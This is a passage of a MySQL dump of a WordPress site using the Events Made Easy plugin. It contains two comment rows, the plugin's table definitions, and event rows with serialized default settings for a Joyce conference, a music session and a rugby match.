INSERT INTO `wp_comments` (`comment_ID`, `comment_post_ID`, `comment_author`, `comment_author_email`, `comment_author_url`, `comment_author_IP`, `comment_date`, `comment_date_gmt`, `comment_content`, `comment_karma`, `comment_approved`, `comment_agent`, `comment_type`, `comment_parent`, `user_id`) VALUES
(1, 1, 'A WordPress Commenter', 'wapuu@wordpress.example', 'https://wordpress.org/', '', '2022-10-23 07:29:40', '2022-10-23 07:29:40', 'Hi, this is a comment.\nTo get started with moderating, editing, and deleting comments, please visit the Comments screen in the dashboard.\nCommenter avatars come from <a href=\"https://en.gravatar.com/\">Gravatar</a>.', 0, 'post-trashed', '', 'comment', 0, 0),
(2, 10, 'blackRa1n', 'blackra1n@notreal.wac.tf', '', '172.19.0.1', '2022-10-23 08:25:29', '2022-10-23 08:25:29', 'yoooooo that\'s legit!', 0, '1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', 'comment', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_answers`
--

CREATE TABLE `wp_eme_answers` (
  `answer_id` int(11) NOT NULL,
  `type` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `related_id` mediumint(9) DEFAULT 0,
  `booking_id` mediumint(9) DEFAULT 0,
  `person_id` mediumint(9) DEFAULT 0,
  `member_id` mediumint(9) DEFAULT 0,
  `field_id` int(11) DEFAULT 0,
  `answer` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `eme_grouping` int(11) DEFAULT 0,
  `occurence` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_attendances`
--

CREATE TABLE `wp_eme_attendances` (
  `id` int(11) NOT NULL,
  `type` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `person_id` int(11) DEFAULT NULL,
  `related_id` int(11) DEFAULT NULL,
  `creation_date` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_bookings`
--

CREATE TABLE `wp_eme_bookings` (
  `booking_id` mediumint(9) NOT NULL,
  `event_id` mediumint(9) NOT NULL,
  `person_id` mediumint(9) NOT NULL,
  `payment_id` mediumint(9) DEFAULT NULL,
  `status` tinyint(4) DEFAULT 1,
  `booking_seats` mediumint(9) NOT NULL,
  `booking_seats_mp` varchar(250) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `waitinglist` tinyint(1) DEFAULT 0,
  `booking_comment` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_price` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `extra_charge` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `creation_date` datetime DEFAULT NULL,
  `modif_date` datetime DEFAULT NULL,
  `payment_date` datetime DEFAULT '0000-00-00 00:00:00',
  `booking_paid` tinyint(1) DEFAULT 0,
  `received` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `remaining` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `pg` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `pg_pid` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `reminder` int(11) DEFAULT 0,
  `transfer_nbr_be97` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `discount` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `discountids` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dcodes_entered` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dcodes_used` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dgroupid` int(11) DEFAULT 0,
  `attend_count` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_categories`
--

CREATE TABLE `wp_eme_categories` (
  `category_id` int(11) NOT NULL,
  `category_name` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `category_prefix` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `category_slug` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_countries`
--

CREATE TABLE `wp_eme_countries` (
  `id` int(11) NOT NULL,
  `alpha_2` char(2) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `alpha_3` char(3) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `num_3` char(3) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `lang` varchar(10) COLLATE utf8mb4_unicode_ci DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_dgroups`
--

CREATE TABLE `wp_eme_dgroups` (
  `id` int(11) NOT NULL,
  `description` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `maxdiscounts` tinyint(3) UNSIGNED DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_discounts`
--

CREATE TABLE `wp_eme_discounts` (
  `id` int(11) NOT NULL,
  `name` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `type` tinyint(3) UNSIGNED DEFAULT 0,
  `coupon` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `dgroup` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `value` tinytext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `maxcount` tinyint(3) UNSIGNED DEFAULT 0,
  `count` tinyint(3) UNSIGNED DEFAULT 0,
  `strcase` tinyint(1) DEFAULT 1,
  `use_per_seat` tinyint(1) DEFAULT 0,
  `valid_from` datetime DEFAULT NULL,
  `valid_to` datetime DEFAULT NULL,
  `properties` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_eme_events`
--

CREATE TABLE `wp_eme_events` (
  `event_id` mediumint(9) NOT NULL,
  `event_status` mediumint(9) DEFAULT 1,
  `event_author` mediumint(9) DEFAULT 0,
  `event_name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `event_prefix` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_slug` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_url` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_start` datetime DEFAULT NULL,
  `event_end` datetime DEFAULT NULL,
  `creation_date` datetime DEFAULT NULL,
  `modif_date` datetime DEFAULT NULL,
  `event_notes` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_rsvp` tinyint(1) DEFAULT 0,
  `event_tasks` tinyint(1) DEFAULT 0,
  `price` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `currency` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `rsvp_number_days` mediumint(5) DEFAULT 0,
  `rsvp_number_hours` mediumint(5) DEFAULT 0,
  `event_seats` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_contactperson_id` mediumint(9) DEFAULT 0,
  `location_id` mediumint(9) DEFAULT 0,
  `recurrence_id` mediumint(9) DEFAULT 0,
  `event_category_ids` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_attributes` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_properties` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_page_title_format` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_single_event_format` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_contactperson_email_body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_respondent_email_body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_registration_recorded_ok_html` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_registration_pending_email_body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_registration_updated_email_body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_registration_cancelled_email_body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_registration_paid_email_body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_registration_trashed_email_body` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_registration_form_format` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_cancel_form_format` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `registration_requires_approval` tinyint(1) DEFAULT 0,
  `registration_wp_users_only` tinyint(1) DEFAULT 0,
  `event_image_url` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_image_id` mediumint(9) DEFAULT 0,
  `event_external_ref` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_eme_events`
--

INSERT INTO `wp_eme_events` (`event_id`, `event_status`, `event_author`, `event_name`, `event_prefix`, `event_slug`, `event_url`, `event_start`, `event_end`, `creation_date`, `modif_date`, `event_notes`, `event_rsvp`, `event_tasks`, `price`, `currency`, `rsvp_number_days`, `rsvp_number_hours`, `event_seats`, `event_contactperson_id`, `location_id`, `recurrence_id`, `event_category_ids`, `event_attributes`, `event_properties`, `event_page_title_format`, `event_single_event_format`, `event_contactperson_email_body`, `event_respondent_email_body`, `event_registration_recorded_ok_html`, `event_registration_pending_email_body`, `event_registration_updated_email_body`, `event_registration_cancelled_email_body`, `event_registration_paid_email_body`, `event_registration_trashed_email_body`, `event_registration_form_format`, `event_cancel_form_format`, `registration_requires_approval`, `registration_wp_users_only`, `event_image_url`, `event_image_id`, `event_external_ref`) VALUES
(1, 5, 1, 'Orality in James Joyce Conference', '', 'orality-in-james-joyce-conference', '', '2022-10-30 16:00:00', '2022-10-30 18:00:00', '2022-10-23 16:13:23', '2022-10-23 16:13:23', '', 0, 0, '0', 'EUR', 0, 0, '10', -1, 1, 0, '', 'a:0:{}', 'a:138:{s:14:\"create_wp_user\";i:0;s:12:\"auto_approve\";i:0;s:14:\"ignore_pending\";i:0;s:15:\"email_only_once\";i:0;s:16:\"person_only_once\";i:0;s:11:\"invite_only\";i:0;s:7:\"all_day\";i:0;s:15:\"take_attendance\";i:0;s:25:\"require_user_confirmation\";i:0;s:11:\"min_allowed\";i:1;s:11:\"max_allowed\";i:10;s:22:\"rsvp_start_number_days\";s:0:\"\";s:23:\"rsvp_start_number_hours\";s:0:\"\";s:17:\"rsvp_start_target\";s:0:\"\";s:15:\"rsvp_end_target\";s:5:\"start\";s:13:\"rsvp_discount\";s:0:\"\";s:17:\"waitinglist_seats\";i:0;s:18:\"check_free_waiting\";i:0;s:18:\"rsvp_discountgroup\";s:0:\"\";s:21:\"rsvp_addpersontogroup\";a:0:{}s:13:\"rsvp_password\";s:0:\"\";s:10:\"use_paypal\";i:0;s:16:\"use_legacypaypal\";i:0;s:7:\"use_2co\";i:0;s:12:\"use_webmoney\";i:0;s:8:\"use_fdgg\";i:0;s:10:\"use_mollie\";i:0;s:12:\"use_payconiq\";i:0;s:12:\"use_worldpay\";i:0;s:10:\"use_stripe\";i:0;s:13:\"use_braintree\";i:0;s:13:\"use_instamojo\";i:0;s:15:\"use_mercadopago\";i:0;s:9:\"use_fondy\";i:0;s:11:\"use_offline\";i:0;s:16:\"cancel_rsvp_days\";i:0;s:15:\"cancel_rsvp_age\";i:0;s:16:\"attendance_begin\";i:5;s:14:\"attendance_end\";i:0;s:18:\"ticket_template_id\";i:0;s:11:\"ticket_mail\";s:8:\"approval\";s:16:\"wp_page_template\";s:0:\"\";s:12:\"use_hcaptcha\";i:0;s:13:\"use_recaptcha\";i:0;s:11:\"use_captcha\";i:0;s:18:\"dyndata_all_fields\";i:0;s:18:\"booking_attach_ids\";i:0;s:18:\"pending_attach_ids\";i:0;s:15:\"paid_attach_ids\";i:0;s:15:\"multiprice_desc\";s:0:\"\";s:10:\"price_desc\";s:0:\"\";s:16:\"attendancerecord\";i:0;s:18:\"skippaymentoptions\";i:0;s:7:\"vat_pct\";s:1:\"0\";s:26:\"task_registered_users_only\";i:0;s:21:\"task_require_approval\";b:0;s:18:\"task_allow_overlap\";i:0;s:18:\"task_reminder_days\";s:0:\"\";s:26:\"rsvp_pending_reminder_days\";s:0:\"\";s:27:\"rsvp_approved_reminder_days\";s:0:\"\";s:27:\"event_page_title_format_tpl\";i:0;s:29:\"event_single_event_format_tpl\";i:0;s:34:\"event_contactperson_email_body_tpl\";i:0;s:39:\"event_registration_recorded_ok_html_tpl\";i:0;s:31:\"event_respondent_email_body_tpl\";i:0;s:41:\"event_registration_pending_email_body_tpl\";i:0;s:45:\"event_registration_userpending_email_body_tpl\";i:0;s:41:\"event_registration_updated_email_body_tpl\";i:0;s:43:\"event_registration_cancelled_email_body_tpl\";i:0;s:41:\"event_registration_trashed_email_body_tpl\";i:0;s:34:\"event_registration_form_format_tpl\";i:0;s:28:\"event_cancel_form_format_tpl\";i:0;s:38:\"event_registration_paid_email_body_tpl\";i:0;s:37:\"event_contactperson_email_subject_tpl\";i:0;s:34:\"event_respondent_email_subject_tpl\";i:0;s:44:\"event_registration_pending_email_subject_tpl\";i:0;s:48:\"event_registration_userpending_email_subject_tpl\";i:0;s:44:\"event_registration_updated_email_subject_tpl\";i:0;s:46:\"event_registration_cancelled_email_subject_tpl\";i:0;s:44:\"event_registration_trashed_email_subject_tpl\";i:0;s:41:\"event_registration_paid_email_subject_tpl\";i:0;s:52:\"contactperson_registration_pending_email_subject_tpl\";i:0;s:49:\"contactperson_registration_pending_email_body_tpl\";i:0;s:54:\"contactperson_registration_cancelled_email_subject_tpl\";i:0;s:51:\"contactperson_registration_cancelled_email_body_tpl\";i:0;s:48:\"contactperson_registration_ipn_email_subject_tpl\";i:0;s:45:\"contactperson_registration_ipn_email_body_tpl\";i:0;s:49:\"contactperson_registration_paid_email_subject_tpl\";i:0;s:46:\"contactperson_registration_paid_email_body_tpl\";i:0;s:26:\"attendance_unauth_scan_tpl\";i:0;s:24:\"attendance_auth_scan_tpl\";i:0;s:29:\"task_signup_email_subject_tpl\";i:0;s:26:\"task_signup_email_body_tpl\";i:0;s:32:\"cp_task_signup_email_subject_tpl\";i:0;s:29:\"cp_task_signup_email_body_tpl\";i:0;s:37:\"task_signup_pending_email_subject_tpl\";i:0;s:34:\"task_signup_pending_email_body_tpl\";i:0;s:40:\"cp_task_signup_pending_email_subject_tpl\";i:0;s:37:\"cp_task_signup_pending_email_body_tpl\";i:0;s:37:\"task_signup_updated_email_subject_tpl\";i:0;s:34:\"task_signup_updated_email_body_tpl\";i:0;s:39:\"task_signup_cancelled_email_subject_tpl\";i:0;s:36:\"task_signup_cancelled_email_body_tpl\";i:0;s:42:\"cp_task_signup_cancelled_email_subject_tpl\";i:0;s:39:\"cp_task_signup_cancelled_email_body_tpl\";i:0;s:37:\"task_signup_trashed_email_subject_tpl\";i:0;s:34:\"task_signup_trashed_email_body_tpl\";i:0;s:27:\"task_signup_form_format_tpl\";i:0;s:32:\"task_signup_recorded_ok_html_tpl\";i:0;s:38:\"task_signup_reminder_email_subject_tpl\";i:0;s:35:\"task_signup_reminder_email_body_tpl\";i:0;s:45:\"event_registration_reminder_email_subject_tpl\";i:0;s:42:\"event_registration_reminder_email_body_tpl\";i:0;s:53:\"event_registration_pending_reminder_email_subject_tpl\";i:0;s:50:\"event_registration_pending_reminder_email_body_tpl\";i:0;s:33:\"event_contactperson_email_subject\";s:0:\"\";s:30:\"event_respondent_email_subject\";s:0:\"\";s:40:\"event_registration_pending_email_subject\";s:0:\"\";s:44:\"event_registration_userpending_email_subject\";s:0:\"\";s:41:\"event_registration_userpending_email_body\";s:0:\"\";s:40:\"event_registration_updated_email_subject\";s:0:\"\";s:42:\"event_registration_cancelled_email_subject\";s:0:\"\";s:37:\"event_registration_paid_email_subject\";s:0:\"\";s:40:\"event_registration_trashed_email_subject\";s:0:\"\";s:45:\"contactperson_registration_pending_email_body\";s:0:\"\";s:47:\"contactperson_registration_cancelled_email_body\";s:0:\"\";s:41:\"contactperson_registration_ipn_email_body\";s:0:\"\";s:48:\"contactperson_registration_pending_email_subject\";s:0:\"\";s:50:\"contactperson_registration_cancelled_email_subject\";s:0:\"\";s:44:\"contactperson_registration_ipn_email_subject\";s:0:\"\";s:45:\"contactperson_registration_paid_email_subject\";s:0:\"\";s:42:\"contactperson_registration_paid_email_body\";s:0:\"\";s:29:\"attendance_unauth_scan_format\";s:0:\"\";s:27:\"attendance_auth_scan_format\";s:0:\"\";s:41:\"event_registration_reminder_email_subject\";s:0:\"\";s:38:\"event_registration_reminder_email_body\";s:0:\"\";s:49:\"event_registration_pending_reminder_email_subject\";s:0:\"\";s:46:\"event_registration_pending_reminder_email_body\";s:0:\"\";}', '', '', '', '', '', '', '', '', '', '', '', '', 0, 0, '', 0, ''),
(2, 5, 1, 'Traditional music session', '', 'traditional-music-session', '', '2022-11-20 20:00:00', '2022-11-20 22:00:00', '2022-10-23 16:13:23', '2022-10-23 16:13:23', '', 0, 0, '0', 'EUR', 0, 0, '10', -1, 2, 0, '', 'a:0:{}', 'a:138:{s:14:\"create_wp_user\";i:0;s:12:\"auto_approve\";i:0;s:14:\"ignore_pending\";i:0;s:15:\"email_only_once\";i:0;s:16:\"person_only_once\";i:0;s:11:\"invite_only\";i:0;s:7:\"all_day\";i:0;s:15:\"take_attendance\";i:0;s:25:\"require_user_confirmation\";i:0;s:11:\"min_allowed\";i:1;s:11:\"max_allowed\";i:10;s:22:\"rsvp_start_number_days\";s:0:\"\";s:23:\"rsvp_start_number_hours\";s:0:\"\";s:17:\"rsvp_start_target\";s:0:\"\";s:15:\"rsvp_end_target\";s:5:\"start\";s:13:\"rsvp_discount\";s:0:\"\";s:17:\"waitinglist_seats\";i:0;s:18:\"check_free_waiting\";i:0;s:18:\"rsvp_discountgroup\";s:0:\"\";s:21:\"rsvp_addpersontogroup\";a:0:{}s:13:\"rsvp_password\";s:0:\"\";s:10:\"use_paypal\";i:0;s:16:\"use_legacypaypal\";i:0;s:7:\"use_2co\";i:0;s:12:\"use_webmoney\";i:0;s:8:\"use_fdgg\";i:0;s:10:\"use_mollie\";i:0;s:12:\"use_payconiq\";i:0;s:12:\"use_worldpay\";i:0;s:10:\"use_stripe\";i:0;s:13:\"use_braintree\";i:0;s:13:\"use_instamojo\";i:0;s:15:\"use_mercadopago\";i:0;s:9:\"use_fondy\";i:0;s:11:\"use_offline\";i:0;s:16:\"cancel_rsvp_days\";i:0;s:15:\"cancel_rsvp_age\";i:0;s:16:\"attendance_begin\";i:5;s:14:\"attendance_end\";i:0;s:18:\"ticket_template_id\";i:0;s:11:\"ticket_mail\";s:8:\"approval\";s:16:\"wp_page_template\";s:0:\"\";s:12:\"use_hcaptcha\";i:0;s:13:\"use_recaptcha\";i:0;s:11:\"use_captcha\";i:0;s:18:\"dyndata_all_fields\";i:0;s:18:\"booking_attach_ids\";i:0;s:18:\"pending_attach_ids\";i:0;s:15:\"paid_attach_ids\";i:0;s:15:\"multiprice_desc\";s:0:\"\";s:10:\"price_desc\";s:0:\"\";s:16:\"attendancerecord\";i:0;s:18:\"skippaymentoptions\";i:0;s:7:\"vat_pct\";s:1:\"0\";s:26:\"task_registered_users_only\";i:0;s:21:\"task_require_approval\";b:0;s:18:\"task_allow_overlap\";i:0;s:18:\"task_reminder_days\";s:0:\"\";s:26:\"rsvp_pending_reminder_days\";s:0:\"\";s:27:\"rsvp_approved_reminder_days\";s:0:\"\";s:27:\"event_page_title_format_tpl\";i:0;s:29:\"event_single_event_format_tpl\";i:0;s:34:\"event_contactperson_email_body_tpl\";i:0;s:39:\"event_registration_recorded_ok_html_tpl\";i:0;s:31:\"event_respondent_email_body_tpl\";i:0;s:41:\"event_registration_pending_email_body_tpl\";i:0;s:45:\"event_registration_userpending_email_body_tpl\";i:0;s:41:\"event_registration_updated_email_body_tpl\";i:0;s:43:\"event_registration_cancelled_email_body_tpl\";i:0;s:41:\"event_registration_trashed_email_body_tpl\";i:0;s:34:\"event_registration_form_format_tpl\";i:0;s:28:\"event_cancel_form_format_tpl\";i:0;s:38:\"event_registration_paid_email_body_tpl\";i:0;s:37:\"event_contactperson_email_subject_tpl\";i:0;s:34:\"event_respondent_email_subject_tpl\";i:0;s:44:\"event_registration_pending_email_subject_tpl\";i:0;s:48:\"event_registration_userpending_email_subject_tpl\";i:0;s:44:\"event_registration_updated_email_subject_tpl\";i:0;s:46:\"event_registration_cancelled_email_subject_tpl\";i:0;s:44:\"event_registration_trashed_email_subject_tpl\";i:0;s:41:\"event_registration_paid_email_subject_tpl\";i:0;s:52:\"contactperson_registration_pending_email_subject_tpl\";i:0;s:49:\"contactperson_registration_pending_email_body_tpl\";i:0;s:54:\"contactperson_registration_cancelled_email_subject_tpl\";i:0;s:51:\"contactperson_registration_cancelled_email_body_tpl\";i:0;s:48:\"contactperson_registration_ipn_email_subject_tpl\";i:0;s:45:\"contactperson_registration_ipn_email_body_tpl\";i:0;s:49:\"contactperson_registration_paid_email_subject_tpl\";i:0;s:46:\"contactperson_registration_paid_email_body_tpl\";i:0;s:26:\"attendance_unauth_scan_tpl\";i:0;s:24:\"attendance_auth_scan_tpl\";i:0;s:29:\"task_signup_email_subject_tpl\";i:0;s:26:\"task_signup_email_body_tpl\";i:0;s:32:\"cp_task_signup_email_subject_tpl\";i:0;s:29:\"cp_task_signup_email_body_tpl\";i:0;s:37:\"task_signup_pending_email_subject_tpl\";i:0;s:34:\"task_signup_pending_email_body_tpl\";i:0;s:40:\"cp_task_signup_pending_email_subject_tpl\";i:0;s:37:\"cp_task_signup_pending_email_body_tpl\";i:0;s:37:\"task_signup_updated_email_subject_tpl\";i:0;s:34:\"task_signup_updated_email_body_tpl\";i:0;s:39:\"task_signup_cancelled_email_subject_tpl\";i:0;s:36:\"task_signup_cancelled_email_body_tpl\";i:0;s:42:\"cp_task_signup_cancelled_email_subject_tpl\";i:0;s:39:\"cp_task_signup_cancelled_email_body_tpl\";i:0;s:37:\"task_signup_trashed_email_subject_tpl\";i:0;s:34:\"task_signup_trashed_email_body_tpl\";i:0;s:27:\"task_signup_form_format_tpl\";i:0;s:32:\"task_signup_recorded_ok_html_tpl\";i:0;s:38:\"task_signup_reminder_email_subject_tpl\";i:0;s:35:\"task_signup_reminder_email_body_tpl\";i:0;s:45:\"event_registration_reminder_email_subject_tpl\";i:0;s:42:\"event_registration_reminder_email_body_tpl\";i:0;s:53:\"event_registration_pending_reminder_email_subject_tpl\";i:0;s:50:\"event_registration_pending_reminder_email_body_tpl\";i:0;s:33:\"event_contactperson_email_subject\";s:0:\"\";s:30:\"event_respondent_email_subject\";s:0:\"\";s:40:\"event_registration_pending_email_subject\";s:0:\"\";s:44:\"event_registration_userpending_email_subject\";s:0:\"\";s:41:\"event_registration_userpending_email_body\";s:0:\"\";s:40:\"event_registration_updated_email_subject\";s:0:\"\";s:42:\"event_registration_cancelled_email_subject\";s:0:\"\";s:37:\"event_registration_paid_email_subject\";s:0:\"\";s:40:\"event_registration_trashed_email_subject\";s:0:\"\";s:45:\"contactperson_registration_pending_email_body\";s:0:\"\";s:47:\"contactperson_registration_cancelled_email_body\";s:0:\"\";s:41:\"contactperson_registration_ipn_email_body\";s:0:\"\";s:48:\"contactperson_registration_pending_email_subject\";s:0:\"\";s:50:\"contactperson_registration_cancelled_email_subject\";s:0:\"\";s:44:\"contactperson_registration_ipn_email_subject\";s:0:\"\";s:45:\"contactperson_registration_paid_email_subject\";s:0:\"\";s:42:\"contactperson_registration_paid_email_body\";s:0:\"\";s:29:\"attendance_unauth_scan_format\";s:0:\"\";s:27:\"attendance_auth_scan_format\";s:0:\"\";s:41:\"event_registration_reminder_email_subject\";s:0:\"\";s:38:\"event_registration_reminder_email_body\";s:0:\"\";s:49:\"event_registration_pending_reminder_email_subject\";s:0:\"\";s:46:\"event_registration_pending_reminder_email_body\";s:0:\"\";}', '', '', '', '', '', '', '', '', '', '', '', '', 0, 0, '', 0, ''),
(3, 5, 1, '6 Nations, Italy VS Ireland', '', '6-nations-italy-vs-ireland', '', '2023-10-23 22:00:00', '2023-10-23 23:59:59', '2022-10-23 16:13:23', '2022-10-23 16:13:23', '', 0, 0, '0', 'EUR', 0, 0, '10', -1, 3, 0, '', 'a:0:{}', 'a:138:{s:14:\"create_wp_user\";i:0;s:12:\"auto_approve\";i:0;s:14:\"ignore_pending\";i:0;s:15:\"email_only_once\";i:0;s:16:\"person_only_once\";i:0;s:11:\"invite_only\";i:0;s:7:\"all_day\";i:0;s:15:\"take_attendance\";i:0;s:25:\"require_user_confirmation\";i:0;s:11:\"min_allowed\";i:1;s:11:\"max_allowed\";i:10;s:22:\"rsvp_start_number_days\";s:0:\"\";s:23:\"rsvp_start_number_hours\";s:0:\"\";s:17:\"rsvp_start_target\";s:0:\"\";s:15:\"rsvp_end_target\";s:5:\"start\";s:13:\"rsvp_discount\";s:0:\"\";s:17:\"waitinglist_seats\";i:0;s:18:\"check_free_waiting\";i:0;s:18:\"rsvp_discountgroup\";s:0:\"\";s:21:\"rsvp_addpersontogroup\";a:0:{}s:13:\"rsvp_password\";s:0:\"\";s:10:\"use_paypal\";i:0;s:16:\"use_legacypaypal\";i:0;s:7:\"use_2co\";i:0;s:12:\"use_webmoney\";i:0;s:8:\"use_fdgg\";i:0;s:10:\"use_mollie\";i:0;s:12:\"use_payconiq\";i:0;s:12:\"use_worldpay\";i:0;s:10:\"use_stripe\";i:0;s:13:\"use_braintree\";i:0;s:13:\"use_instamojo\";i:0;s:15:\"use_mercadopago\";i:0;s:9:\"use_fondy\";i:0;s:11:\"use_offline\";i:0;s:16:\"cancel_rsvp_days\";i:0;s:15:\"cancel_rsvp_age\";i:0;s:16:\"attendance_begin\";i:5;s:14:\"attendance_end\";i:0;s:18:\"ticket_template_id\";i:0;s:11:\"ticket_mail\";s:8:\"approval\";s:16:\"wp_page_template\";s:0:\"\";s:12:\"use_hcaptcha\";i:0;s:13:\"use_recaptcha\";i:0;s:11:\"use_captcha\";i:0;s:18:\"dyndata_all_fields\";i:0;s:18:\"booking_attach_ids\";i:0;s:18:\"pending_attach_ids\";i:0;s:15:\"paid_attach_ids\";i:0;s:15:\"multiprice_desc\";s:0:\"\";s:10:\"price_desc\";s:0:\"\";s:16:\"attendancerecord\";i:0;s:18:\"skippaymentoptions\";i:0;s:7:\"vat_pct\";s:1:\"0\";s:26:\"task_registered_users_only\";i:0;s:21:\"task_require_approval\";b:0;s:18:\"task_allow_overlap\";i:0;s:18:\"task_reminder_days\";s:0:\"\";s:26:\"rsvp_pending_reminder_days\";s:0:\"\";s:27:\"rsvp_approved_reminder_days\";s:0:\"\";s:27:\"event_page_title_format_tpl\";i:0;s:29:\"event_single_event_format_tpl\";i:0;s:34:\"event_contactperson_email_body_tpl\";i:0;s:39:\"event_registration_recorded_ok_html_tpl\";i:0;s:31:\"event_respondent_email_body_tpl\";i:0;s:41:\"event_registration_pending_email_body_tpl\";i:0;s:45:\"event_registration_userpending_email_body_tpl\";i:0;s:41:\"event_registration_updated_email_body_tpl\";i:0;s:43:\"event_registration_cancelled_email_body_tpl\";i:0;s:41:\"event_registration_trashed_email_body_tpl\";i:0;s:34:\"event_registration_form_format_tpl\";i:0;s:28:\"event_cancel_form_format_tpl\";i:0;s:38:\"event_registration_paid_email_body_tpl\";i:0;s:37:\"event_contactperson_email_subject_tpl\";i:0;s:34:\"event_respondent_email_subject_tpl\";i:0;s:44:\"event_registration_pending_email_subject_tpl\";i:0;s:48:\"event_registration_userpending_email_subject_tpl\";i:0;s:44:\"event_registration_updated_email_subject_tpl\";i:0;s:46:\"event_registration_cancelled_email_subject_tpl\";i:0;s:44:\"event_registration_trashed_email_subject_tpl\";i:0;s:41:\"event_registration_paid_email_subject_tpl\";i:0;s:52:\"contactperson_registration_pending_email_subject_tpl\";i:0;s:49:\"contactperson_registration_pending_email_body_tpl\";i:0;s:54:\"contactperson_registration_cancelled_email_subject_tpl\";i:0;s:51:\"contactperson_registration_cancelled_email_body_tpl\";i:0;s:48:\"contactperson_registration_ipn_email_subject_tpl\";i:0;s:45:\"contactperson_registration_ipn_email_body_tpl\";i:0;s:49:\"contactperson_registration_paid_email_subject_tpl\";i:0;s:46:\"contactperson_registration_paid_email_body_tpl\";i:0;s:26:\"attendance_unauth_scan_tpl\";i:0;s:24:\"attendance_auth_scan_tpl\";i:0;s:29:\"task_signup_email_subject_tpl\";i:0;s:26:\"task_signup_email_body_tpl\";i:0;s:32:\"cp_task_signup_email_subject_tpl\";i:0;s:29:\"cp_task_signup_email_body_tpl\";i:0;s:37:\"task_signup_pending_email_subject_tpl\";i:0;s:34:\"task_signup_pending_email_body_tpl\";i:0;s:40:\"cp_task_signup_pending_email_subject_tpl\";i:0;s:37:\"